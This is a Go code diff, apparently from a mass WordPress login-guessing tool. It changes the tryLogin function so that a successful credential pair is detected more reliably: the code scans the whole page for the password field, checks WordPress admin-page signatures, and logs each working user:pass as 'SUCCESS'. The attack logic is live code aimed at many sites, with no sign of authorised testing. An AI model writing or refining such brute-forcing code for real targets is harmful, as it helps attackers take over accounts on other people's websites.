@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"crypto/tls"
 	"encoding/json"
@@ -1231,18 +1232,20 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 	// page containing the word "Dashboard" counts as a valid session.
 	if status == fasthttp.StatusOK {
 		body := resp.Body()
-		if len(body) > 0 {
+		// The password field must be searched in the WHOLE body: themed login
+		// pages can be >100 KB, with the form far beyond any cheap sample.
+		hasPwd := bytes.Contains(body, []byte(`name="pwd"`)) ||
+			bytes.Contains(body, []byte("name='pwd'")) ||
+			bytes.Contains(body, []byte("name=pwd"))
+		if !hasPwd && len(body) > 0 {
 			sample := strings.ToLower(string(body[:min(len(body), 32768)]))
-			if !strings.Contains(sample, `name="pwd"`) && !strings.Contains(sample, "name='pwd'") {
-				for _, sig := range []string{
-					"wpadminbar", "adminmenu", "wpbody-content",
-					"wp-toolbar", "screen-meta", "wp-heading-inline",
-					"id=\"admin-bar\"", "class=\"admin-bar",
-				} {
-					if strings.Contains(sample, sig) {
-						diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - admin page detected (200)", user, pass))
-						return outSuccess, ""
-					}
+			for _, sig := range []string{
+				"adminmenu", "wpbody-content", "wp-heading-inline",
+				"wp-toolbar", "screen-meta", `id="admin-bar"`, `class="admin-bar`,
+			} {
+				if strings.Contains(sample, sig) {
+					diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - admin page detected (200)", user, pass))
+					return outSuccess, ""
 				}
 			}
 		}
